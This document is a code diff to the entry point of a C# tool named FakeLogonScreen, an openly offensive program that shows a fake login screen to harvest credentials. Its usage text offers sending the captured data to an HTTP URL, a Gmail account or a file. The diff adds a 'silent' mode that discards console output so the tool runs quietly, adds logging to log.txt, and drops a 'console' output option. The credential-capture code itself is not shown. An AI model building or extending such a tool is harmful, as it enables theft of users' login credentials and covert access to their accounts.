@@ -16,10 +16,34 @@ namespace FakeLogonScreen
         /// <summary>
         /// The main entry point for the application.
         /// </summary>
-
         [STAThread]
         static void Main(string[] args)
         {
+            FileStream ostrm;
+            StreamWriter writer;
+            TextWriter oldOut = Console.Out;
+            try
+            {
+                if (args.LastOrDefault() == "silent")
+                {
+                    Console.SetOut(new StreamWriter(Stream.Null));
+                }
+                else
+                {
+                    ostrm = new FileStream("./log.txt", FileMode.OpenOrCreate, FileAccess.Write);
+                    writer = new StreamWriter(ostrm);
+                    writer.AutoFlush = true;
+                    Console.SetOut(writer);
+                }
+
+            }
+            catch (Exception e)
+            {
+                Console.WriteLine("Cannot open log.txt for writing");
+                Console.WriteLine(e.Message);
+                return;
+            }
+
             Dictionary<string, string> method = new Dictionary<string, string> { { "method", "http" } };
             if (args.Length == 0)
             {
@@ -28,7 +52,6 @@ namespace FakeLogonScreen
                 Console.WriteLine("http [url]");
                 Console.WriteLine("gmail [email] [password]");
                 Console.WriteLine("file [file path]");
-                Console.WriteLine("console");
                 return;
             }
             if (args.Length >= 1)
@@ -48,7 +71,6 @@ namespace FakeLogonScreen
                     Console.WriteLine("http [url]");
                     Console.WriteLine("gmail [email] [password]");
                     Console.WriteLine("file [file path]");
-                    Console.WriteLine("console");
                     return;
                 }
             }
@@ -66,7 +88,6 @@ namespace FakeLogonScreen
                     Console.WriteLine("http [url]");
                     Console.WriteLine("gmail [email] [password]");
                     Console.WriteLine("file [file path]");
-                    Console.WriteLine("console");
                     return;
                 }
             }
@@ -83,13 +104,8 @@ namespace FakeLogonScreen
                     Console.WriteLine("http [url]");
                     Console.WriteLine("gmail [email] [password]");
                     Console.WriteLine("file [file path]");
-                    Console.WriteLine("console");
                     return;
                 }
-            }
-            else if (method["method"] == "console")
-            {
-                
             }
             else
             {
@@ -98,7 +114,6 @@ namespace FakeLogonScreen
                 Console.WriteLine("http [url]");
                 Console.WriteLine("gmail [email] [password]");
                 Console.WriteLine("file [file path]");
-                Console.WriteLine("console");
             }
             Utils.showData(method, "Starting fake login screen");
 
